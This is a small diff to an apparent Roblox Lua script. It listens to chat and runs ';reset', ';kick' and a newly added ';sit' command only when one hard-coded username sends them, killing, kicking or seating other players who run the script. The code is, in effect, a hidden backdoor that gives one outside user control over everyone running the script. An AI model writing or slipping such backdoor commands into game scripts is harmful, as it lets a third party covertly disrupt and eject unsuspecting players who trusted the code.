@@ -48,9 +48,12 @@ Listening = TextChatService.MessageReceived:Connect(function(prompt)
    
    elseif cmd == ";reset" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV then
    target.Character.Humanoid.Health = 0
-   end
+
 elseif cmd == ";kick" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV then
    target:Kick("skill issue tbh")
+
+elseif cmd == ";sit" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV then
+   target.Character.Humanoid.Sit = true
    end
 
 end)
